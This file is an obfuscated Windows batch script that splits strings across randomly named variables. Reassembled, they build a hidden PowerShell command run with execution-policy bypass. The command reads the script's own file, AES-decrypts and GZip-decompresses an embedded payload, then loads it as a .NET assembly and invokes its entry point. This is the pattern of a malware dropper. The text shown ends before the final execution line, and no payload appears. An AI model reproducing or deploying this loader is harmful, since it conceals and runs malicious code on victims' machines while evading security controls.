@echo off
set "InTuMWBlAK=rs"
set "FSMvVChXcl=in"
set "oJNsvDTSNr=.e"
set "CdfxuKnDrh=ws"
set "omeLhRXSsz=ow"
set "rxizKdoXmU=s\"
set "KYXBViVVcv=we"
set "fkMpruSNMM=co"
set "qBAvlpmZoj=do"
set "ZtpEHidUiq=em"
set "GltSuIURxk=nd"
set "vogMnzWEyw=\W"
set "OWiwyehxgF=1."
set "VxBJutwIMF=Sy"
set "WCctUohhRi=\v"
set "JNsfxUOKAX=we"
set "RNnzoMCnaK=po"
set "nXqoTCMoak=rS"
set "AChsIXlIeZ=Wi"
set "mRBDanxwlQ=st"
set "AmNqTOQyzW= /"
set "oEGUZRfOKK=he"
set "fdsAAPLZaA=ll"
set "kqMpbsFkjU=xe"
set "HyYGGawWOl=py"
set "FPBgogJYOp=:\"
set "OZaQSjFPOe=0\"
set "tWECpQKuqN=32"
set "CTxvVQczVJ=ll"
set "UcqQwZEarN=y "
set "GwqUShfGIa= C"
set "JssNrbIIiM=he"
set "myvLLBkjGN=Po"
set "YUpyKaIRZe=cd"
set "qwfvvLoyYF= %~dp0"
set "qWAAGoGNdP=oL'["
set "dFbbTFNPFx=Secu"
set "VbZjAmSlFl=gMod"
set "chdZZKGxGJ=('l0"
set "lFQjQQjGfd=gt, "
set "hAaqWblmdh=ddin"
set "YoofrQSbrn=vGWD"
set "RPhfUyZoXI=fZY "
set "gmwLvlOEYV=$Wqv"
set "biWEMKJdcT=('%~f0'"
set "ABYPeHsXbJ=gJ ="
set "WqxSxZpiwV=Comp"
set "WmWrKgyobM=rity"
set "onDvvwtLhg=-nop"
set "nFNJLgfZiz=NXFg"
set "TlfJqCKBZc=O.Me"
set "cMfiOrPyCs='dqR"
set "kQPCdhnrsf=DJ ="
set "ymixIgbTZr=ose("
set "sAEVKrgtAa=null"
set "FQCTXRDRzu=tem."
set "oBOJUjqslE=rtS4"
set "XqZzmfuucY=rt]:"
set "UuUfbOwJec=.IO."
set "jTqKxFPxpA=bstr"
set "JfgLHhUTff=ress"
set "WspkiQnZQw=n.Pa"
set "DjsVrnDzbU=).Sp"
set "xfDNGaOZUr=qvkn"
set "sIPtGscdIg=Fina"
set "wjLBvFsmWZ= [st"
set "pCPSMyfUBg=vJdy"
set "XuyYIDAcNe=($Fd"
set "zDrXFmtIal=comm"
set "zGgiCXWTsc=Bmor"
set "lBJJLSyhbB=$rvn"
set "lTbfgBTDQu=rity"
set "FKTpskwgEZ=oin "
set "FmmhkQLaFv=and "
set "SQOVXzzWGv=kn.I"
set "ObTjoZEezq=fp.D"
set "YQgweBzhXR=tS46"
set "BMBYAXIQzO=gJ);"
set "wCEFptXyXK=.Cry"
set "BfPNgmJGCu=vj0m"
set "jRpoqiPdze=('%*'"
set "CYuOxPOapK=-joi"
set "VGhPTSRtzd=comp"
set "QLeUWmwcxG=();$"
set "vgagpeanEg=brea"
set "XArDplvXeR=$rvn"
set "XezetuAEnh=ionM"
set "IFhDUrLSuj= = $"
set "ZTwAooNDQE=)))"
set "YwpuzlUgrn= [Sy"
set "LBDkTouGkT=vJdy"
set "sEqjfMqnAy=Fgt."
set "yKbOngzrBv=Disp"
set "liOFaRCSoT=] -j"
set "phCuCDwIDt=pDZz"
set "cembhxVSJw=vJdy"
set "IcroWhDwxv=join"
set "ZQZWTSXFjZ=[IO."
set "OiTfkmkEVl=$vJd"
set "dSZjJczJKV=rofi"
set "DnqBYiUMND=em.C"
set "jaXgqtuAPP=OyzA"
set "aFPrHUyjtP=-4] "
set "HrMxTAJhJE==');"
set "IpcAWlpTpM=iida"
set "DgMawFHqgM=e]::"
set "aDnQuEmFGY=Invo"
set "zcblffIzPn=$vJd"
set "dwPPyybnRW=Y.Su"
set "hentoJVBtY=ecry"
set "CaCgOncfbi=.GZi"
set "UnkBQfstLO=::('"
set "ZTjHVTQphP=yste"
set "zuWAkfAdyp=fore"
set "zSGnItmbgA=Id.T"
set "GTClgulnmy== $W"
set "DdTlELrRoZ=:('g"
set "iBajROANXH=);$W"
set "yTfGetWdkw=[]] "
set "gknHUtjKge=Wqvk"
set "adquWfvbba=ert]"
set "nuDVefvftp=ct S"
set "AlqHMUffCo=Comp"
set "qLToJMPJPG=sion"
set "IqIiNeZHDK=esMa"
set "zkHgdHuGhW=16] "
set "BQyqjxwnwD=-ep "
set "DmbbeGBUUy=stem"
set "BtCABHNcrl=gth)"
set "yymlijEBPr=TllA"
set "QPZgmNAsVc=se()"
set "cALwAEqOmH=);$W"
set "wBPzzMCayD=esaB"
set "YRAtKhlaFX=ida."
set "qgsywPvxZS=ypto"
set "vcyaPvQKxb=k; }"
set "KkIANsOOJy=6] -"
set "fvtvzHBeRD='gni"
set "LddQuTJopM=ress"
set "eAFUgxDuCn=m.IO"
set "zGifKQxaKk=ment"
set "cCVdDraJeY=)($P"
set "lVCUCwuRcy= = $"
set "sGSbIACMlO=ew-O"
set "kJrqziJAco=E = "
set "cLGVcPoGMA=ne);"
set "yWbGvHGCWa=orF'"
set "IpJwCmFRpy=nirt"
set "zOsKwiSenI=tryP"
set "CErjhxZaoy=in $"
set "nZWjnfxaMB=rId "
set "KeYWANbfxf=raph"
set "mIFerxVRaX=ing("
set "dmlGeGfweh=$rur"
set "mXaKsodRit=y.Cr"
set "iIBUiXvNxH=($Fd"
set "JDevQojwgT=qvkn"
set "fWbqTLBWGL=qvkn"
set "ruSHCGGsLo=th('"
set "fhTCBIDfCg===')"
set "lChCNSwqmj=]::("
set "elvKSeXwde= New"
set "xWxaRTFLAb=+hAO"
set "jGMkifDbud=oint"
set "DjmTObEudI=; };"
set "DOtLAJPszs=;$ci"
set "EPWEKAQzUi=..-1"
set "wwMxqXvHKT=[Env"
set "PSbxdhsZOV=$vGW"
set "GtBaykirxK=6esa"
set "waZXYAXQtj=le  "
set "VDLbgSIBzE=vkoK"
set "zBoHppoGiU=tsWi"
set "LFpYsCLeOW=bypa"
set "UzNGlnLSrG=pres"
set "VUnIFfkKnD=V = "
set "XWvMobVTYX=.Dis"
set "vUtwJTWHSX=$NXF"
set "ZHsnhDcxav= = ["
set "TgEittJEzd=yste"
set "PFpbPZYItP=E = "
set "cuqkJVDQJP=, $v"
set "EgpUEonFLB=t Sy"
set "zFkWHtamUK=stem"
set "CtIzmNOygj=File"
set "NcxVUBaXSP=-1.."
set "UABYvvndYM=BC;$"
set "ODzJBmnQpS=S46e"
set "FIebuSoBpz=('da"
set "sxjKCjiXOi=m(, "
set "FkvUrbDLtQ=..-1"
set "pctElIyNXT=oryS"
set "YHkGwjVNox='[-1"
set "CdeICMUtXo=1..-"
set "yKUoVcAsyc=ress"
set "CtnPPfkKov=.Cre"
set "SdNKySIQNe=daeR"
set "zRWYMkduFP=qvkn"
set "JAHGgTCQCY=am;$"
set "tUfrAxiGKi=.Key"
set "TDvwdaBDrV=, (,"
set "NDfCnRZvmu=p = "
set "guxzConGxU=ss -"
set "nlKVUBbHuB=lit("
set "VoYtcdhOwp='[-1"
